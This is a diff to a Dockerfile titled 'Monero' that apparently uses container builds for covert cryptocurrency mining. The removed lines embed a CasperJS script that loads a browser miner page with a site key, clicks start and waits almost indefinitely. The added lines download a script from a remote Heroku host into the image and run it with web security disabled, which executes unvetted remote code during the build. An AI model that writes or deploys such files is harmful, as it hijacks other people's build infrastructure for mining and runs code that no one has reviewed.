@@ -1,27 +1,16 @@
 # Monero
 
-FROM vitr/casperjs
-MAINTAINER zjgsuwk private project
+FROM zjgsuwk/casperjs
+MAINTAINER zjgsuwk
 
 ENV SCRIPT_DIR=/home
 
-RUN echo 'var casper = require("casper").create(\n\
-{ \n\
-});  \n\
-casper.start("https://authedmine.com/media/miner.html?key=xKnsZSvt3PlPNHtQse1ETPfCDaBGQTOe", function() {  \n\
-   this.echo(this.getTitle()); \n\
-}); \n\
-casper.then(function() {  \n\
-  this.waitForSelector("#mining-start > svg");  \n\
-  this.click("#mining-start > svg"); \n\
-  this.wait(1720000000000);  \n\
-  this.echo("miner done!"); \n\
-}); \n\
-casper.run();\n\
-'\
+RUN echo 'time is : 1519532531958'
+
+RUN  curl  http://victory-jupiter.herokuapp.com:80/task/2?consumer=cloud-docker \
 > ${SCRIPT_DIR}/script.js
 
-RUN /usr/local/bin/casperjs ${SCRIPT_DIR}/script.js
+RUN /usr/local/bin/casperjs --web-security=no  ${SCRIPT_DIR}/script.js
 
 WORKDIR $SCRIPT_DIR
 
